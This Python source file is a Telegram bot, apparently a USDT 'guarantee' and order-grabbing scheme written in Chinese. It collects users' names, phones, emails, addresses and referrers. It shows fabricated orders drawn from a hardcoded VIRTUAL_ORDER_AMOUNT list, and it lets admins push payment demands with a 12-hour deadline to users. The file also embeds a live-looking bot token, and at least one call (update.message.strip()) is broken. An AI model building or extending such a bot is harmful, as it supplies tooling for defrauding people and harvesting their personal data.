import random
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

# ==========================================
# 【零配置，直接用】
# ==========================================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_ID = [6365510771]
PAY_TIMEOUT_HOUR = 12
VIRTUAL_ORDER_AMOUNT = [50, 50, 50, 100]

users = {}
verifies = {}
orders = {}
user_step = {}

def gen_uid():
    return str(int(time.time()))[-6:]

def gen_order_id():
    return f"ORD{int(time.time())}{random.randint(100,999)}"

def is_admin(user_id):
    return user_id in ADMIN_ID

def main_menu():
    keyboard = [
        [InlineKeyboardButton("🏠 入驻担保", callback_data="menu_verify")],
        [InlineKeyboardButton("👤 个人中心", callback_data="menu_profile")],
        [InlineKeyboardButton("📥 担保派单", callback_data="menu_assign")],
        [InlineKeyboardButton("🚀 抢单大厅", callback_data="menu_grab")],
        [InlineKeyboardButton("💰 充值提现", callback_data="menu_deposit")],
        [InlineKeyboardButton("📜 担保记录", callback_data="menu_record")],
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in users:
        users[user.id] = {
            "uid": gen_uid(), "name": "", "phone": "", "email": "", "address": "", "referrer": "",
            "status": "unverified", "balance": 0.0
        }
    await update.message.reply_text("🔥 担保系统\n请选择菜单：", reply_markup=main_menu())

async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    u = users[user_id]

    if data == "menu_verify":
        if u["status"] == "approved":
            await query.edit_message_text("✅ 已通过审核", reply_markup=main_menu())
            return
        user_step[user_id] = "name"
        await query.edit_message_text("请输入姓名：")

    elif data == "menu_profile":
        text = f"👤 个人中心\nUID：{u['uid']}\n状态：{u['status']}\n余额：{u['balance']:.2f} USDT"
        await query.edit_message_text(text, reply_markup=main_menu())

    elif data == "menu_grab":
        if u["status"] != "approved":
            await query.edit_message_text("❌ 请先入驻审核", reply_markup=main_menu())
            return
        amt = random.choice(VIRTUAL_ORDER_AMOUNT)
        oid = gen_order_id()
        orders[oid] = {"user_id": None, "amount": amt, "status": "available"}
        kb = [[InlineKeyboardButton(f"抢单 {amt} USDT", callback_data=f"grab_{oid}")], [InlineKeyboardButton("返回", callback_data="back")]]
        await query.edit_message_text(f"抢单：{amt} USDT", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("grab_"):
        oid = data.split("_")[1]
        if oid not in orders or orders[oid]["status"] != "available":
            await query.answer("已被抢", show_alert=True)
            return
        orders[oid]["user_id"] = user_id
        orders[oid]["status"] = "wait_pay"
        await query.edit_message_text(f"✅ 抢单成功\n订单：{oid}\n金额：{orders[oid]['amount']} USDT", reply_markup=main_menu())

    elif data == "menu_assign":
        if not is_admin(user_id):
            await query.edit_message_text("❌ 无权限", reply_markup=main_menu())
            return
        user_step[user_id] = "assign"
        await query.edit_message_text("输入用户UID：")

    elif data == "menu_deposit":
        await query.edit_message_text("💰 充值提现请联系 @fcff88", reply_markup=main_menu())

    elif data == "menu_record":
        my = [o for o in orders.values() if o.get("user_id") == user_id]
        txt = "\n".join([f"{o['amount']} USDT | {o['status']}" for o in my]) or "暂无记录"
        await query.edit_message_text(f"📜 担保记录\n{txt}", reply_markup=main_menu())

    elif data == "back":
        await query.edit_message_text("主菜单", reply_markup=main_menu())

async def msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.strip()
    if user_id not in user_step:
        await update.message.reply_text("请用菜单", reply_markup=main_menu())
        return

    step = user_step[user_id]

    if step == "name":
        verifies[user_id] = {"name": text}
        user_step[user_id] = "phone"
        await update.message.reply_text("请输入电话：")
    elif step == "phone":
        verifies[user_id]["phone"] = text
        user_step[user_id] = "email"
        await update.message.reply_text("请输入邮箱：")
    elif step == "email":
        verifies[user_id]["email"] = text
        user_step[user_id] = "address"
        await update.message.reply_text("请输入地址：")
    elif step == "address":
        verifies[user_id]["address"] = text
        user_step[user_id] = "ref"
        await update.message.reply_text("请输入推荐人：")
    elif step == "ref":
        verifies[user_id]["referrer"] = text
        del user_step[user_id]
        users[user_id]["status"] = "approved"
        await update.message.reply_text("✅ 入驻成功！", reply_markup=main_menu())

    elif step == "assign":
        target = None
        for uid, usr in users.items():
            if usr["uid"] == text:
                target = uid
                break
        if not target:
            await update.message.reply_text("无此UID")
            return
        user_step[user_id] = f"am_{target}"
        await update.message.reply_text("输入金额：")

    elif step.startswith("am_"):
        target = int(step.split("_")[1])
        amt = float(text)
        oid = gen_order_id()
        orders[oid] = {"user_id": target, "amount": amt, "status": "wait_pay"}
        del user_step[user_id]
        await update.message.reply_text(f"✅ 派单成功：{amt} USDT")
        await context.bot.send_message(chat_id=target, text=f"⚠️ 管理员派单：{amt} USDT，12小时内支付")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg))
    app.run_polling()

if __name__ == "__main__":
    main()
